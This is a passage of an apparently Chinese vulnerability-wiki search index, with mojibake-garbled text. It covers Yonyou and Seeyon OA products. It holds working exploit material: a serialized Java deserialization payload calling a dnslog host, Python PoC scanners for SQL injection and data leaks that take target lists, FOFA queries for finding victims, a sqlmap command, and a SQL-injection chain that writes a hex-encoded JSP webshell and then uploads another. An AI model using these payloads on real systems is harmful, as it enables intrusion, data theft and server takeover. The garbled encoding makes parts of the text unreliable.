\"\\xac\\xed\\x00\\x05\\x73\\x72\\x00\\x11\\x6a\\x61\\x76\\x61\\x2e\\x75\\x74\\x69\\x6c\\x2e\\x48\\x61\\x73\\x68\\x4d\\x61\\x70\\x05\\x07\\xda\\xc1\\xc3\\x16\\x60\\xd1\\x03\\x00\\x02\\x46\\x00\\x0a\\x6c\\x6f\\x61\\x64\\x46\\x61\\x63\\x74\\x6f\\x72\\x49\\x00\\x09\\x74\\x68\\x72\\x65\\x73\\x68\\x6f\\x6c\\x64\\x78\\x70\\x3f\\x40\\x00\\x00\\x00\\x00\\x00\\x0c\\x77\\x08\\x00\\x00\\x00\\x10\\x00\\x00\\x00\\x01\\x73\\x72\\x00\\x0c\\x6a\\x61\\x76\\x61\\x2e\\x6e\\x65\\x74\\x2e\\x55\\x52\\x4c\\x96\\x25\\x37\\x36\\x1a\\xfc\\xe4\\x72\\x03\\x00\\x07\\x49\\x00\\x08\\x68\\x61\\x73\\x68\\x43\\x6f\\x64\\x65\\x49\\x00\\x04\\x70\\x6f\\x72\\x74\\x4c\\x00\\x09\\x61\\x75\\x74\\x68\\x6f\\x72\\x69\\x74\\x79\\x74\\x00\\x12\\x4c\\x6a\\x61\\x76\\x61\\x2f\\x6c\\x61\\x6e\\x67\\x2f\\x53\\x74\\x72\\x69\\x6e\\x67\\x3b\\x4c\\x00\\x04\\x66\\x69\\x6c\\x65\\x71\\x00\\x7e\\x00\\x03\\x4c\\x00\\x04\\x68\\x6f\\x73\\x74\\x71\\x00\\x7e\\x00\\x03\\x4c\\x00\\x08\\x70\\x72\\x6f\\x74\\x6f\\x63\\x6f\\x6c\\x71\\x00\\x7e\\x00\\x03\\x4c\\x00\\x03\\x72\\x65\\x66\\x71\\x00\\x7e\\x00\\x03\\x78\\x70\\xff\\xff\\xff\\xff\\x00\\x00\\x00\\x50\\x74\\x00\\x11\"+dnslog+\"\\x3a\\x38\\x30\\x74\\x00\\x00\\x74\\x00\\x0e\"+dnslog+\"\\x74\\x00\\x04\\x68\\x74\\x74\\x70\\x70\\x78\\x74\\x00\\x18\\x68\\x74\\x74\\x70\\x3a\\x2f\\x2f\"+dnslog+\"\\x3a\\x38\\x30\\x78\" uploadHeader={\"User-Agent\": \"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36\"} req = requests.post(\"http://+\"ip\"+/service/~xbrl/XbrlPersistenceServlet\", headers=uploadHeader, verify=False, data=data, timeout=25) print (req.text) Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/OA‰∫ßÂìÅÊºèÊ¥û/Áî®ÂèãOA/Áî®Âèã NC bsh.servlet.BshServlet ËøúÁ®ãÂëΩ‰ª§ÊâßË°åÊºèÊ¥û.html":{"url":"book/OA‰∫ßÂìÅÊºèÊ¥û/Áî®ÂèãOA/Áî®Âèã NC bsh.servlet.BshServlet ËøúÁ®ãÂëΩ‰ª§ÊâßË°åÊºèÊ¥û.html","title":"Áî®Âèã NC bsh.servlet.BshServlet ËøúÁ®ãÂëΩ‰ª§ÊâßË°åÊºèÊ¥û","keywords":"","body":"Áî®Âèã NC bsh.servlet.BshServlet ËøúÁ®ãÂëΩ‰ª§ÊâßË°åÊºèÊ¥û ÊºèÊ¥ûÊèèËø∞ Áî®Âèã NC bsh.servlet.BshServlet Â≠òÂú®ËøúÁ®ãÂëΩ‰ª§ÊâßË°åÊºèÊ¥ûÔºåÈÄöËøáBeanShell ÊâßË°åËøúÁ®ãÂëΩ‰ª§Ëé∑ÂèñÊúçÂä°Âô®ÊùÉÈôê ÊºèÊ¥ûÂΩ±Âìç [!NOTE] Áî®Âèã NC FOFA [!NOTE] icon_hash=\"1085941792\" ÊºèÊ¥ûÂ§çÁé∞ ËÆøÈóÆÈ°µÈù¢Â¶Ç‰∏ã ÊºèÊ¥ûUrl‰∏∫ /servlet/~ic/bsh.servlet.BshServlet Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/OA‰∫ßÂìÅÊºèÊ¥û/Áî®ÂèãOA/Áî®ÂèãERP-NC ÁõÆÂΩïÈÅçÂéÜÊºèÊ¥û.html":{"url":"book/OA‰∫ßÂìÅÊºèÊ¥û/Áî®ÂèãOA/Áî®ÂèãERP-NC ÁõÆÂΩïÈÅçÂéÜÊºèÊ¥û.html","title":"Áî®ÂèãERP-NC ÁõÆÂΩïÈÅçÂéÜÊºèÊ¥û","keywords":"","body":"Áî®ÂèãERP-NC ÁõÆÂΩïÈÅçÂéÜÊºèÊ¥û ÊºèÊ¥ûÊèèËø∞ Áî®ÂèãERP-NC Â≠òÂú®ÁõÆÂΩïÈÅçÂéÜÊºèÊ¥ûÔºåÊîªÂáªËÄÖÂèØ‰ª•ÈÄöËøáÁõÆÂΩïÈÅçÂéÜËé∑ÂèñÊïèÊÑüÊñá‰ª∂‰ø°ÊÅØ ÊºèÊ¥ûÂΩ±Âìç [!NOTE] Áî®ÂèãERP-NC FOFA [!NOTE] app=\"Áî®Âèã-UFIDA-NC\" ÊºèÊ¥ûÂ§çÁé∞ POC‰∏∫ /NCFindWeb?service=IPreAlertConfigService&filename= Êü•Áúã ncwslogin.jsp Êñá‰ª∂ Goby & POC [!NOTE] YongYou ERP-NC directory traversal Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/OA‰∫ßÂìÅÊºèÊ¥û/Áî®ÂèãOA/Áî®Âèã U8 OA test.jsp SQLÊ≥®ÂÖ•ÊºèÊ¥û.html":{"url":"book/OA‰∫ßÂìÅÊºèÊ¥û/Áî®ÂèãOA/Áî®Âèã U8 OA test.jsp SQLÊ≥®ÂÖ•ÊºèÊ¥û.html","title":"Áî®Âèã U8 OA test.jsp SQLÊ≥®ÂÖ•ÊºèÊ¥û","keywords":"","body":"Áî®Âèã U8 OA test.jsp SQLÊ≥®ÂÖ•ÊºèÊ¥û ÊºèÊ¥ûÊèèËø∞ Áî®Âèã U8 OA test.jspÊñá‰ª∂Â≠òÂú® SQLÊ≥®ÂÖ•ÊºèÊ¥ûÔºåÁî±‰∫é‰∏éËá¥ËøúOA‰ΩøÁî®Áõ∏ÂêåÁöÑÊñá‰ª∂Ôºå‰∫éÊòØÂ≠òÂú®‰∫ÜÂêåÊ†∑ÁöÑÊºèÊ¥û ÊºèÊ¥ûÂΩ±Âìç [!NOTE] Áî®Âèã U8 OA FOFA [!NOTE] \"Áî®ÂèãU8-OA\" ÊºèÊ¥ûÂ§çÁé∞ ÂèØÂèÇËÄÉ ÊñáÁ´† Ëá¥ËøúOA A6 test.jsp SQLÊ≥®ÂÖ•ÊºèÊ¥û ÁôªÂΩïÈ°µÈù¢Â¶Ç‰∏ã POC /yyoa/common/js/menu/test.jsp?doType=101&S1=(SELECT%20MD5(1)) Âà©Áî®ÊñπÊ≥ï‰∏éËá¥ËøúOA ÁöÑSQLÊ≥®ÂÖ•Á±ª‰ºº ÊºèÊ¥ûPOC import requests import sys import random import re from requests.packages.urllib3.exceptions import InsecureRequestWarning def title(): print('+------------------------------------------') print('+ \\033[34mPOC_Des: http://wiki.peiqi.tech \\033[0m') print('+ \\033[34mGithub : https://github.com/PeiQi0 \\033[0m') print('+ \\033[34mÂÖ¨‰ºóÂè∑ : PeiQiÊñáÂ∫ì \\033[0m') print('+ \\033[34mTitle : Áî®Âèã U8 OA test.jsp SQLÊ≥®ÂÖ•ÊºèÊ¥û \\033[0m') print('+ \\033[36m‰ΩøÁî®Ê†ºÂºè: python3 poc.py \\033[0m') print('+ \\033[36mFile >>> ip.txt \\033[0m') print('+------------------------------------------') def POC_1(target_url): vuln_url = target_url + \"/yyoa/common/js/menu/test.jsp?doType=101&S1=(SELECT%20md5(1))\" headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", } try: requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response = requests.get(url=vuln_url, headers=headers, verify=False, timeout=5) if \"c4ca4238a0b923820dcc509a6f75849b\" in response.text and response.status_code == 200: print(\"\\033[32m[o] ÁõÆÊ†á {}Â≠òÂú®ÊºèÊ¥û \\n[o] ÂìçÂ∫îÂú∞ÂùÄ: {} \\033[0m\".format(target_url, vuln_url)) else: print(\"\\033[31m[x] ÁõÆÊ†á {}‰∏çÂ≠òÂú®ÊºèÊ¥û \\033[0m\".format(target_url)) except Exception as e: print(\"\\033[31m[x] ÁõÆÊ†á {} ËØ∑Ê±ÇÂ§±Ë¥• \\033[0m\".format(target_url)) if __name__ == '__main__': title() target_url = str(input(\"\\033[35mPlease input Attack Url\\nUrl >>> \\033[0m\")) POC_1(target_url) Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/OA‰∫ßÂìÅÊºèÊ¥û/Áî®ÂèãOA/Áî®Âèã NCCloud FSÊñá‰ª∂ÁÆ°ÁêÜSQLÊ≥®ÂÖ•.html":{"url":"book/OA‰∫ßÂìÅÊºèÊ¥û/Áî®ÂèãOA/Áî®Âèã NCCloud FSÊñá‰ª∂ÁÆ°ÁêÜSQLÊ≥®ÂÖ•.html","title":"Áî®Âèã NCCloud FSÊñá‰ª∂ÁÆ°ÁêÜSQLÊ≥®ÂÖ•","keywords":"","body":"Áî®Âèã NCCloud FSÊñá‰ª∂ÁÆ°ÁêÜSQLÊ≥®ÂÖ• ÊºèÊ¥ûÊèèËø∞ Áî®Âèã NCCloud FSÊñá‰ª∂ÁÆ°ÁêÜÁôªÂΩïÈ°µÈù¢ÂØπÁî®Êà∑ÂêçÂèÇÊï∞Ê≤°ÊúâËøáÊª§ÔºåÂ≠òÂú®SQLÊ≥®ÂÖ• ÊºèÊ¥ûÂΩ±Âìç [!NOTE] Áî®Âèã NCCloud FOFA [!NOTE] \"NCCloud\" ÊºèÊ¥ûÊèèËø∞ ÁôªÂΩïÈ°µÈù¢Â¶Ç‰∏ã Âú®Â∫îÁî®‰∏≠Â≠òÂú®Êñá‰ª∂ÊúçÂä°Âô®ÁÆ°ÁêÜÁôªÂΩïÈ°µÈù¢ http://xxx.xxx.xxx.xxx/fs/ ÁôªÂΩïËØ∑Ê±ÇÂåÖÂ¶Ç‰∏ã GET /fs/console?username=123&password=%2F7Go4Iv2Xqlml0WjkQvrvzX%2FgBopF8XnfWPUk69fZs0%3D HTTP/1.1 Host: xxx.xxx.xxx.xxx Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-TW;q=0.6 Cookie: JSESSIONID=2CF7A25EE7F77A064A9DA55456B6994D.server; JSESSIONID=0F83D6A0F3D65B8CD4C26DFEE4FCBC3C.server Connection: close ‰ΩøÁî®SqlmapÂØπusernameÂèÇÊï∞ ËøõË°åSQLÊ≥®ÂÖ• sqlmap -r sql.txt -p username Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/OA‰∫ßÂìÅÊºèÊ¥û/Ëá¥ËøúOA/":{"url":"book/OA‰∫ßÂìÅÊºèÊ¥û/Ëá¥ËøúOA/","title":"Ëá¥ËøúOA","keywords":"","body":"Ëá¥ËøúOA Ëá¥ËøúOA A6 createMysql.jsp Êï∞ÊçÆÂ∫ìÊïèÊÑü‰ø°ÊÅØÊ≥ÑÈú≤ Ëá¥ËøúOA A6 DownExcelBeanServlet Áî®Êà∑ÊïèÊÑü‰ø°ÊÅØÊ≥ÑÈú≤ Ëá¥ËøúOA A6 initDataAssess.jsp Áî®Êà∑ÊïèÊÑü‰ø°ÊÅØÊ≥ÑÈú≤ Ëá¥ËøúOA A6 test.jsp SQLÊ≥®ÂÖ•ÊºèÊ¥û Ëá¥ËøúOA A8 htmlofficeservlet RCEÊºèÊ¥û Ëá¥ËøúOA getSessionList.jsp SessionÊ≥ÑÊºèÊºèÊ¥û Ëá¥ËøúOA ajax.do ÁôªÂΩïÁªïËøá ‰ªªÊÑèÊñá‰ª∂‰∏ä‰º† CNVD-2021-01627 Ëá¥ËøúOA webmail.do‰ªªÊÑèÊñá‰ª∂‰∏ãËΩΩ CNVD-2020-62422 Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/OA‰∫ßÂìÅÊºèÊ¥û/Ëá¥ËøúOA/Ëá¥ËøúOA A6 createMysql.jsp Êï∞ÊçÆÂ∫ìÊïèÊÑü‰ø°ÊÅØÊ≥ÑÈú≤.html":{"url":"book/OA‰∫ßÂìÅÊºèÊ¥û/Ëá¥ËøúOA/Ëá¥ËøúOA A6 createMysql.jsp Êï∞ÊçÆÂ∫ìÊïèÊÑü‰ø°ÊÅØÊ≥ÑÈú≤.html","title":"Ëá¥ËøúOA A6 createMysql.jsp Êï∞ÊçÆÂ∫ìÊïèÊÑü‰ø°ÊÅØÊ≥ÑÈú≤","keywords":"","body":"Ëá¥ËøúOA A6 createMysql.jsp Êï∞ÊçÆÂ∫ìÊïèÊÑü‰ø°ÊÅØÊ≥ÑÈú≤ ÊºèÊ¥ûÊèèËø∞ Ëá¥ËøúOA A6 Â≠òÂú®Êï∞ÊçÆÂ∫ìÊïèÊÑü‰ø°ÊÅØÊ≥ÑÈú≤ÔºåÊîªÂáªËÄÖÂèØ‰ª•ÈÄöËøáËÆøÈóÆÁâπÂÆöÁöÑURLËé∑ÂèñÊï∞ÊçÆÂ∫ìË¥¶Êà∑‰ª•ÂèäÂØÜÁ†Å MD5 ÊºèÊ¥ûÂΩ±Âìç [!NOTE] Ëá¥ËøúOA A6 FOFA [!NOTE] title=\"Ëá¥ËøúA8+ÂçèÂêåÁÆ°ÁêÜËΩØ‰ª∂.A6\" ÊºèÊ¥ûÂ§çÁé∞ ÂΩìËÆøÈóÆÂ¶Ç‰∏ãURLÊó∂ÊâßË°å‰∫ÜSQLËØ≠Âè• select * from mysql.user; ËøõË°åÊü•ËØ¢Âπ∂ËøîÂõûÂà∞È°µÈù¢‰∏≠ /yyoa/createMysql.jsp /yyoa/ext/createMysql.jsp ÊºèÊ¥ûÂà©Áî®POC import requests import sys import random import re import base64 import time from requests.packages.urllib3.exceptions import InsecureRequestWarning def title(): print('+------------------------------------------') print('+ \\033[34mPOC_Des: http://wiki.peiqi.tech \\033[0m') print('+ \\033[34mGithub : https://github.com/PeiQi0 \\033[0m') print('+ \\033[34mÂÖ¨‰ºóÂè∑ : PeiQiÊñáÂ∫ì \\033[0m') print('+ \\033[34mVersion: Ëá¥ËøúOA A6 \\033[0m') print('+ \\033[36m‰ΩøÁî®Ê†ºÂºè: python3 poc.py \\033[0m') print('+ \\033[36mUrl >>> http://xxx.xxx.xxx.xxx \\033[0m') print('+------------------------------------------') def POC_1(target_url): vuln_url = target_url + \"/yyoa/createMysql.jsp\" headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", } try: requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response = requests.post(url=vuln_url, headers=headers, verify=False, timeout=5) print(\"\\033[36m[o] Ê≠£Âú®ËØ∑Ê±Ç {}/yyoa/createMysql.jsp..... \\033[0m\".format(target_url)) if 'root' in response.text and response.status_code == 200: print(\"\\033[36m[o] ÂìçÂ∫î‰∏∫:{}\\n \\033[0m\".format(response.text)) else: print(\"\\033[31m[x] ÁõÆÊ†á {} ‰∏ä‰º†WebshellÊñá‰ª∂Â§±Ë¥•\\033[0m\".format(target_url)) sys.exit(0) except Exception as e: print(\"\\033[31m[x] ËØ∑Ê±ÇÂ§±Ë¥• \\033[0m\", e) if __name__ == '__main__': title() target_url = str(input(\"\\033[35mPlease input Attack Url\\nUrl >>> \\033[0m\")) POC_1(target_url) Goby & POC [!NOTE] Â∑≤‰∏ä‰º† https://github.com/PeiQi0/PeiQi-WIKI-POC Goby & POC ÁõÆÂΩï‰∏≠ Seeyon_OA_A6__Disclosure_of_database_sensitive_information Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/OA‰∫ßÂìÅÊºèÊ¥û/Ëá¥ËøúOA/Ëá¥ËøúOA A6 DownExcelBeanServlet Áî®Êà∑ÊïèÊÑü‰ø°ÊÅØÊ≥ÑÈú≤.html":{"url":"book/OA‰∫ßÂìÅÊºèÊ¥û/Ëá¥ËøúOA/Ëá¥ËøúOA A6 DownExcelBeanServlet Áî®Êà∑ÊïèÊÑü‰ø°ÊÅØÊ≥ÑÈú≤.html","title":"Ëá¥ËøúOA A6 DownExcelBeanServlet Áî®Êà∑ÊïèÊÑü‰ø°ÊÅØÊ≥ÑÈú≤","keywords":"","body":"Ëá¥ËøúOA A6 DownExcelBeanServlet Áî®Êà∑ÊïèÊÑü‰ø°ÊÅØÊ≥ÑÈú≤ ÊºèÊ¥ûÊèèËø∞ Ëá¥ËøúOA A6 Â≠òÂú®Êüê‰∏™Êú™ÊéàÊùÉÁöÑÊé•Âè£ÂØºËá¥‰ªªÊÑèËÆøÈóÆËÄÖÂèØ‰∏ãËΩΩOA‰∏≠ÁöÑÁî®Êà∑‰ø°ÊÅØ ÊºèÊ¥ûÂΩ±Âìç [!NOTE] Ëá¥ËøúOA A6 FOFA [!NOTE] title=\"Ëá¥ËøúA8+ÂçèÂêåÁÆ°ÁêÜËΩØ‰ª∂.A6\" ÊºèÊ¥ûÂ§çÁé∞ ËÆøÈóÆÂ¶Ç‰∏ãURLÂç≥ÂèØË∑≥ËΩ¨‰∏ãËΩΩÁî®Êà∑‰ø°ÊÅØÊñá‰ª∂ http://xxx.xxx.xxx.xxx/yyoa/DownExcelBeanServlet?contenttype=username&contentvalue=&state=1&per_id=0 ÂèØ‰ª•ÂÜçÂà©Áî®ÂæóÂà∞ÁöÑÁî®Êà∑Âêç‰ΩøÁî®Âº±Âè£‰ª§ÁàÜÁ†¥ËøõÂÖ•OAËøõ‰∏ÄÊ≠•ÊîªÂáª ÊºèÊ¥ûÂà©Áî®POC import requests import sys import random import re from requests.packages.urllib3.exceptions import InsecureRequestWarning def title(): print('+------------------------------------------') print('+ \\033[34mPOC_Des: http://wiki.peiqi.tech \\033[0m') print('+ \\033[34mGithub : https://github.com/PeiQi0 \\033[0m') print('+ \\033[34mÂÖ¨‰ºóÂè∑ : PeiQiÊñáÂ∫ì \\033[0m') print('+ \\033[34mVersion: Ëá¥ËøúOA A6 \\033[0m') print('+ \\033[36m‰ΩøÁî®Ê†ºÂºè: python3 poc.py \\033[0m') print('+ \\033[36mFile >>> ip.txt \\033[0m') print('+------------------------------------------') def POC_1(target_url): vuln_url = target_url + \"/yyoa/DownExcelBeanServlet?contenttype=username&contentvalue=&state=1&per_id=0\" headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", } try: requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response = requests.get(url=vuln_url, headers=headers, verify=False, timeout=5) if \"@\" in response.text and response.status_code == 200: print(\"\\033[32m[o] ÁõÆÊ†á {}Â≠òÂú®ÊºèÊ¥û,‰∏ãËΩΩÂú∞ÂùÄ:{} \\033[0m\".format(target_url, vuln_url)) else: print(\"\\033[31m[x] ÁõÆÊ†á {}‰∏çÂ≠òÂú®ÊºèÊ¥û \\033[0m\".format(target_url)) except Exception as e: print(\"\\033[31m[x] ËØ∑Ê±ÇÂ§±Ë¥• \\033[0m\", e) def Scan(file_name): with open(file_name, \"r\", encoding='utf8') as scan_url: for url in scan_url: if url[:4] != \"http\": url = \"http://\" + url url = url.strip('\\n') try: POC_1(url) except Exception as e: print(\"\\033[31m[x] ËØ∑Ê±ÇÊä•Èîô \\033[0m\".format(e)) continue if __name__ == '__main__': title() file_name = str(input(\"\\033[35mPlease input Attack File\\nFile >>> \\033[0m\")) Scan(file_name) Goby & POC [!NOTE] Â∑≤‰∏ä‰º† https://github.com/PeiQi0/PeiQi-WIKI-POC Goby & POC ÁõÆÂΩï‰∏≠ Seeyon_OA_A6_DownExcelBeanServlet_User_information_leakage Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/OA‰∫ßÂìÅÊºèÊ¥û/Ëá¥ËøúOA/Ëá¥ËøúOA A6 initDataAssess.jsp Áî®Êà∑ÊïèÊÑü‰ø°ÊÅØÊ≥ÑÈú≤.html":{"url":"book/OA‰∫ßÂìÅÊºèÊ¥û/Ëá¥ËøúOA/Ëá¥ËøúOA A6 initDataAssess.jsp Áî®Êà∑ÊïèÊÑü‰ø°ÊÅØÊ≥ÑÈú≤.html","title":"Ëá¥ËøúOA A6 initDataAssess.jsp Áî®Êà∑ÊïèÊÑü‰ø°ÊÅØÊ≥ÑÈú≤","keywords":"","body":"Ëá¥ËøúOA A6 initDataAssess.jsp Áî®Êà∑ÊïèÊÑü‰ø°ÊÅØÊ≥ÑÈú≤ ÊºèÊ¥ûÊèèËø∞ Ëá¥ËøúOA A6 initDataAssess.jsp Â≠òÂú®Áî®Êà∑ÊïèÊÑü‰ø°ÊÅØÊ≥ÑÈú≤ ÂèØ‰ª•ÈÄöËøáÂæóÂà∞ÁöÑÁî®Êà∑ÂêçÁàÜÁ†¥Áî®Êà∑ÂØÜÁ†ÅËøõÂÖ•ÂêéÂè∞Ëøõ‰∏ÄÊ≠•ÊîªÂáª ÊºèÊ¥ûÂΩ±Âìç [!NOTE] Ëá¥ËøúOA A6 FOFA [!NOTE] title=\"Ëá¥ËøúA8+ÂçèÂêåÁÆ°ÁêÜËΩØ‰ª∂.A6\" ÊºèÊ¥ûÂ§çÁé∞ ËÆøÈóÆ‰∏ãÂàóURLÊ≥ÑÈú≤Áî®Êà∑‰ø°ÊÅØ http://xxx.xxx.xxx.xxx/yyoa/assess/js/initDataAssess.jsp ÊºèÊ¥ûÂà©Áî®POC import requests import sys import random import re from requests.packages.urllib3.exceptions import InsecureRequestWarning def title(): print('+------------------------------------------') print('+ \\033[34mPOC_Des: http://wiki.peiqi.tech \\033[0m') print('+ \\033[34mGithub : https://github.com/PeiQi0 \\033[0m') print('+ \\033[34mÂÖ¨‰ºóÂè∑ : PeiQiÊñáÂ∫ì \\033[0m') print('+ \\033[34mVersion: Ëá¥ËøúOA A6 \\033[0m') print('+ \\033[36m‰ΩøÁî®Ê†ºÂºè: python3 poc.py \\033[0m') print('+ \\033[36mFile >>> ip.txt \\033[0m') print('+------------------------------------------') def POC_1(target_url): vuln_url = target_url + \"/yyoa/assess/js/initDataAssess.jsp\" headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", } try: requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response = requests.get(url=vuln_url, headers=headers, verify=False, timeout=5) if \"/yyoa/index.jsp\" not in response.text and \"personList\" in response.text and response.status_code == 200: print(\"\\033[32m[o] ÁõÆÊ†á {}Â≠òÂú®ÊºèÊ¥û,Ê≥ÑÈú≤Âú∞ÂùÄ:{} \\033[0m\".format(target_url, vuln_url)) else: print(\"\\033[31m[x] ÁõÆÊ†á {}‰∏çÂ≠òÂú®ÊºèÊ¥û \\033[0m\".format(target_url)) except Exception as e: print(\"\\033[31m[x] ËØ∑Ê±ÇÂ§±Ë¥• \\033[0m\") def Scan(file_name): with open(file_name, \"r\", encoding='utf8') as scan_url: for url in scan_url: if url[:4] != \"http\": url = \"http://\" + url url = url.strip('\\n') try: POC_1(url) except Exception as e: print(\"\\033[31m[x] ËØ∑Ê±ÇÊä•Èîô \\033[0m\") continue if __name__ == '__main__': title() file_name = str(input(\"\\033[35mPlease input Attack File\\nFile >>> \\033[0m\")) Scan(file_name) Goby & POC [!NOTE] Â∑≤‰∏ä‰º† https://github.com/PeiQi0/PeiQi-WIKI-POC Goby & POC ÁõÆÂΩï‰∏≠ Seeyon_OA_A6_initDataAssess.jsp_User_information_leakage Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/OA‰∫ßÂìÅÊºèÊ¥û/Ëá¥ËøúOA/Ëá¥ËøúOA A6 test.jsp SQLÊ≥®ÂÖ•ÊºèÊ¥û.html":{"url":"book/OA‰∫ßÂìÅÊºèÊ¥û/Ëá¥ËøúOA/Ëá¥ËøúOA A6 test.jsp SQLÊ≥®ÂÖ•ÊºèÊ¥û.html","title":"Ëá¥ËøúOA A6 test.jsp SQLÊ≥®ÂÖ•ÊºèÊ¥û","keywords":"","body":"Ëá¥ËøúOA A6 test.jsp SQLÊ≥®ÂÖ•ÊºèÊ¥û ÊºèÊ¥ûÊèèËø∞ Ëá¥ËøúOA A6 test.jsp Â≠òÂú®sqlÊ≥®ÂÖ•ÊºèÊ¥ûÔºåÂπ∂ÂèØ‰ª•ÈÄöËøáÊ≥®ÂÖ•ÂÜôÂÖ•webshellÊñá‰ª∂ÊéßÂà∂ÊúçÂä°Âô® ÊºèÊ¥ûÂΩ±Âìç [!NOTE] Ëá¥ËøúOA A6 FOFA [!NOTE] title=\"Ëá¥ËøúA8+ÂçèÂêåÁÆ°ÁêÜËΩØ‰ª∂.A6\" ÊºèÊ¥ûÂ§çÁé∞ ËÆøÈóÆURL http://xxx.xxx.xxx.xxx/yyoa/common/js/menu/test.jsp?doType=101&S1=(SELECT%20database()) ËøîÂõû‰∫ÜÂΩìÂâç‰ΩøÁî®ÁöÑÊï∞ÊçÆÂ∫ì Ë¶ÅÊÉ≥ÂÜôÂÖ•shellÈúÄË¶ÅÁü•ÈÅìÂÜôÂÖ•ÁöÑË∑ØÂæÑ ËøôÈáåÂæóÂà∞Ë∑ØÂæÑ D:\\Program Files\\UFseeyon\\OA\\mysql\\bin..\\ ÈÄöËøá into outfile ÂÜôÂÖ•Êñá‰ª∂ÔºåËøôÈáåÂõ†‰∏∫ jspÊú®È©¨Â≠òÂú®ÁâπÊÆäÁ¨¶Âè∑Ôºå‰ΩøÁî® hexÁºñÁ†Å ‰∏ä‰º†ÂÖÅËÆ∏Êñá‰ª∂‰∏ä‰º†ÁöÑjspÊñá‰ª∂ HEXÁºñÁ†Å 3C25696628726571756573742E676574506172616D657465722822662229213D6E756C6C29286E6577206A6176612E696F2E46696C654F757470757453747265616D286170706C69636174696F6E2E6765745265616C5061746828225C5C22292B726571756573742E676574506172616D65746572282266222929292E777269746528726571756573742E676574506172616D6574657228227422292E67657442797465732829293B253E http://xxx.xxx.xxx.xxx/yyoa/common/js/menu/test.jsp?doType=101&S1=select%20unhex(%273C25696628726571756573742E676574506172616D657465722822662229213D6E756C6C29286E6577206A6176612E696F2E46696C654F757470757453747265616D286170706C69636174696F6E2E6765745265616C5061746828225C22292B726571756573742E676574506172616D65746572282266222929292E777269746528726571756573742E676574506172616D6574657228227422292E67657442797465732829293B253E%27)%20%20into%20outfile%20%27E:/Program Files/UFseeyon/OA/tomcat/webapps/yyoa/test_upload.jsp%27 ÊòæÁ§∫‰∏äÂõæÂàô‰∏ä‰º†ÊàêÂäüÔºåËÆøÈóÆ test_upload.jsp ‰∏∫Á©∫ÁôΩ‰∏çÊä•ÈîôÈ°µÈù¢‰∏çÂ≠òÂú®Â∞±ÊòØ‰∏ä‰º†ÊàêÂäü Âú®ÂèëÈÄÅËØ∑Ê±ÇÂåÖ‰∏ä‰º†webshellÔºåËøôÈáå‰∏ä‰º†ÂÜ∞Ëùé [!NOTE] Ê≥®ÊÑè‰∏ä‰º†ÁöÑwebshellÈúÄË¶ÅurlÁºñÁ†Å‰∏Ä‰∏ã http://xxx.xxx.xxx.xxx/yyoa/peiqi_upload.jsp?f=testwebshell.jsp 